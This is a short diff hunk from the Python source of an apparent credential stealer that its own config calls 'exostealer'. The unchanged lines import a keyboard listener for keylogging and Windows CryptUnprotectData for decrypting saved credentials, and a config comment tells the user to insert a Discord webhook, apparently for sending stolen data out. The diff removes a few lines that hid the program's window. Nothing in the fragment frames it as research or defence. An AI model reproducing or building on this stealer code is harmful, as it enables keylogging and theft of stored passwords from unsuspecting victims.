@@ -25,10 +25,6 @@ from re import findall, match
 from Crypto.Cipher import AES
 from pynput.keyboard import Listener
 from win32crypt import CryptUnprotectData
-from win32gui import GetForegroundWindow, ShowWindow
-
-window = GetForegroundWindow()
-ShowWindow(window , SW_HIDE)
 
 exostealer_config = {
     # Replace this string with your discord webhook
